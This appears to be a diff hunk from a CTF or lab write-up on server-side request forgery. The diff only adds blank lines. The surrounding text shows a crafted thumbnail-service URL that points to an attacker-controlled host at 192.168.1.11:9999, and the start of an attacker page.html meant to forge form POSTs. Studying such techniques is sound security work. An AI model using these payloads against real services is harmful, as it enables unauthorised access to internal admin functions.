@@ -72,9 +72,11 @@ or calling out to server you control, and executing JS there, probably with a fo
 
 ### POSTing from a Server You Control
 This call goes to a page you have control over, and from it, you can have JS make the form request.
+
     http://thumbnail:5000/?l?http:%2f%2f192.168.1.11:9999%2fadmin
 
 page.html:
+
     <!doctype html>
     <html>
         <body>
